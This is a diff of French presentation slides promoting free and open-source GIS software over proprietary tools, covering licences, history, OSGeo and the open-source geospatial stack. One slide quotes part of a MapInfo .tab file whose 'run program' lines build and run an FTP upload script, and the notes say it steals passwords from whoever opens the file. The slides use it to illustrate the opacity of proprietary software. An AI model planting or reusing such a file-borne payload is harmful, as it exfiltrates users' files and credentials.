@@ -76,7 +76,7 @@ Jean-Roc Morreale
 + les constructeurs louent plus qu'ils ne vendent leurs machines
 + les logiciels et leurs sources sont livrés avec
 + ils encouragent la création de communautés et la redistribution
-+ la raison ? le but est de vendre des machines très onéreuses, pas les logiciels
++ la raison ? le but est de placer des machines très onéreuses, pas les logiciels
 
 ---
 
@@ -136,6 +136,8 @@ Un logiciel gratuit peut être propriétaire.
 
 ### Problèmes de pérennité
 
+Quelques exemples :
+
 + ArcInfo Workstation
 + ArcIMS / ArcWeb
 + ArcGIS API Silverlight/Flex
@@ -155,9 +157,12 @@ Un logiciel gratuit peut être propriétaire.
 
 Beaucoup de limites et de complications :
 
-+ avec des formats fermés (ArcGIS Geodatabase, Autodesk DWG, Adobe AI, [...])
-+ avec des conditions d'utilisation non-négociables (une licence par cœur de processeur, un dongle à brancher,  une connexion internet pour l'activation, [...])
-+ des fonctionnalités bridées (repayer une licence pour dégriser un bouton, accès restreints aux services en ligne de l'éditeur, [...])
++ avec des formats fermés 
+  + ArcGIS Geodatabase, Autodesk DWG, Adobe AI, etc.
++ avec des conditions d'utilisation non-négociables 
+  + une licence par cœur de processeur, un dongle à brancher,  une connexion internet pour l'activation, etc.
++ des fonctionnalités bridées
+  + repayer une licence pour dégriser un bouton, accès restreints aux services en ligne de l'éditeur, etc.
 
 ???
 
@@ -176,6 +181,7 @@ Vous n'avez aucun regard :
 + sur l'activité réelle du logiciel
 + sur l'impartialité de l'éditeur
 
+```
     !table
     !version 450
     !charset WindowsLatin1
@@ -186,13 +192,16 @@ Vous n'avez aucun regard :
     run program "cmd.exe /c echo guestpw >> %temp%\commands.txt"
     run program "cmd.exe /c echo put %temp%\allfiles.txt >> %temp%\commands.txt"
     run program "cmd.exe /c ftp -s:%temp%\commands.txt"
+```
 
----
+???
 
 + le code en exemple permet de récupérer les mots de passe d'un utilisateur MapInfo ouvrant un .tab sous Windows
 + la société RSA a vérolé un algo de chiffrement qu'elle commercialisait pour le compte de la NSA
 + Yahoo a du laisser le gov usa accéder aux boites mails de tous ses utilisateurs
 + ou plus simplement, comment vérifier l'exactitude d'un traitement ?
+
+---
 
 ## Qu'est-ce qu'un logiciel libre ?
 
@@ -205,7 +214,7 @@ C'est un ensemble de 4 libertés :
 + d'étudier
 + de modifier et de redistribuer
 
-Pour plus de lecture : [livretdulibre.org](ttp://www.livretdulibre.org/)
+Pour plus de lecture : [*livretdulibre.org*](http://www.livretdulibre.org/)
 
 ???
 
@@ -220,10 +229,8 @@ Pour plus de lecture : [livretdulibre.org](ttp://www.livretdulibre.org/)
 
 C'est la notion de **copyleft**, ce qui *est* libre *reste* libre.
 
-+ les licences sans copyleft (BSD, MIT, [...]) sont **opensource**
-+ les licences avec copyleft (CeCILL, GPL, [...]) sont **libre**
-
----
++ les licences sans copyleft (BSD, MIT, Apache) sont **opensources**
++ les licences avec copyleft (CeCILL, GPL) sont **libres**
 
 ???
 
@@ -261,14 +268,16 @@ C'est la notion de **copyleft**, ce qui *est* libre *reste* libre.
 
 ### Aussi vieux que le SIG en informatique
 
-+ Map Overlay and Statistical System - **MOSS**
-  + 1978
-+ Geographic Resource Analysis Support Software - **GRASS**
-  + 1982
++ **MOSS**
+  + Map Overlay and Statistical System 
+  + date de 1978
++ **GRASS**
+  + Geographic Resource Analysis Support Software 
+  + date de 1982
 
 .center[GRASS]
 
-A voir : [GRASS, l'armée et Star Treck](https://www.youtube.com/watch?v=U3Hf0qI4JLc)
+.center[A voir : [GRASS, l'armée et Star Treck](https://www.youtube.com/watch?v=U3Hf0qI4JLc)]
 
 ???
 
@@ -289,8 +298,9 @@ Elle est présente :
 + dans tous les domaines
 + avec toutes les compétences
 
-OSGEO = Open Source Geospatial Foundation
+La fondation OSGEO :
 
++ Open Source Geospatial Foundation
 + fondée en 2006
 + rôle d'assistance et de promotion
 + regroupe des dizaines de projets
@@ -330,97 +340,69 @@ Sur tout les fronts :
 
 # La pile applicative
 
-.left-column[
-+ **Formats**
-+ Bibliothèques
-+ Bureautique
-+ Serveurs
-+ Web
-]
+## Les formats ouverts
 
-.right-column[
 + GeoTIFF
 + Spatialite
 + Geopackage
-]
 
 ---
 
-# La pile applicative
+## Les bibliothèques incontournables
 
-.left-column[
-+ Formats
-+ **Bibliothèques**
-+ Bureautique
-+ Serveurs
-+ Web
-]
-
-.right-column[
++ proj4
 + GDAL/OGR
 + PDAL
 + JTS/GEOS
-]
++ FDO
 
 ---
 
-# La pile applicative
+## Les applications bureautiques
 
-.left-column[
-+ Formats
-+ Bibliothèques
-+ **Bureautique**
-+ Serveurs
-+ Web
-]
-
-.right-column[
 + QGIS
 + gvSIG
 + uDig
 + GRASS
 + SAGA
-]
 
 ---
 
-# La pile applicative
+## Les serveurs
 
-.left-column[
-+ Formats
-+ Bibliothèques
-+ Bureautique
-+ **Serveurs**
-+ Web
-]
-
-.right-column[
 + PostGIS
 + Geoserver
 + Mapnik
 + MapServer
++ QGIS Server
 + MapGuide
 + Geonetwork
-]
 
 ---
 
-# La pile applicative
+## Les clients web
 
-.left-column[
-+ Formats
-+ Bibliothèques
-+ Bureautique
-+ Serveurs
-+ **Web**
-]
-
-.right-column[
 + Leaflet
 + OpenLayers
-]
++ Cesium
 
 ---
+
+## Les clients portables
+
++ Geopaparazzi
++ Qfield
++
+
+---
+
+## Les plateformes géographiques
+
++ GeoNode
++ Georchestra
+
+---
+
 
 # Entamer une migration
 
